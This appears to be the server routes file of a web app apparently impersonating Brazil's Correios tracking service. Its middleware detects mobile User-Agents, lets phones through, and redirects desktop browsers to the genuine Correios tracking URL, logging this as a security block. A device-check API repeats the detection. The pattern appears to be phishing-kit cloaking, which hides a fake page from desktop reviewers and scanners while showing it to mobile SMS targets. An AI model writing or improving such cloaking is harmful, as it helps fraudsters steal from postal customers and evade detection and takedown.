import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";

// Middleware para detectar dispositivos móveis
function mobileOnlyMiddleware(req: Request, res: Response, next: NextFunction) {
  const userAgent = req.get('User-Agent') || '';
  
  // Padrões para detectar dispositivos móveis
  const mobilePatterns = [
    /Android/i,
    /webOS/i,
    /iPhone/i,
    /iPad/i,
    /iPod/i,
    /BlackBerry/i,
    /Windows Phone/i,
    /Mobile/i,
    /Tablet/i
  ];
  
  // Verifica se é um dispositivo móvel
  const isMobile = mobilePatterns.some(pattern => pattern.test(userAgent));
  
  // Headers adicionais para verificação
  const acceptHeader = req.get('Accept') || '';
  const isBrowser = acceptHeader.includes('text/html');
  
  // Se não for móvel e for um browser (não API), redireciona
  if (!isMobile && isBrowser && !req.path.startsWith('/api')) {
    const officialUrl = 'https://rastreamento.correios.com.br/app/index.php';
    
    // Log da tentativa de acesso
    console.log(`[SECURITY] Desktop access blocked from IP: ${req.ip}, User-Agent: ${userAgent}`);
    
    return res.redirect(302, officialUrl);
  }
  
  next();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Aplica o middleware de segurança apenas em produção ou quando solicitado
  if (process.env.NODE_ENV === 'production' || process.env.ENABLE_MOBILE_ONLY === 'true') {
    app.use(mobileOnlyMiddleware);
  }
  
  // API Routes (sempre permitidas independente do dispositivo)
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });
  
  app.get('/api/device-check', (req, res) => {
    const userAgent = req.get('User-Agent') || '';
    const mobilePatterns = [
      /Android/i, /webOS/i, /iPhone/i, /iPad/i, /iPod/i, 
      /BlackBerry/i, /Windows Phone/i, /Mobile/i, /Tablet/i
    ];
    
    const isMobile = mobilePatterns.some(pattern => pattern.test(userAgent));
    
    res.json({ 
      isMobile,
      userAgent,
      timestamp: new Date().toISOString()
    });
  });

  // use storage to perform CRUD operations on the storage interface
  // e.g. storage.insertUser(user) or storage.getUserByUsername(username)

  const httpServer = createServer(app);

  return httpServer;
}
